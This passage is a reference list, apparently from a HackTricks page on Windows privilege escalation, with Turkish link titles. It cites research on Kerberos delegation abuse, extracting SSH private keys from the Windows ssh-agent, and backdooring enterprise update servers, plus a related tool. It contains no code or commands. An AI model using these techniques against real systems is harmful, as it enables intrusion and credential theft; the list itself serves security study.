- [36] [research.nccgroup.com - Bir Image Değişikliği Privilege Escalation'a Yol Açtığında Kerberos Resource Based Constrained Delegation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Private Key'lerini Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update Server'larını Backdoor Fabrikalarına Dönüştürmek (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Server'larını Backdoor Fabrikalarına Dönüştürmek (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
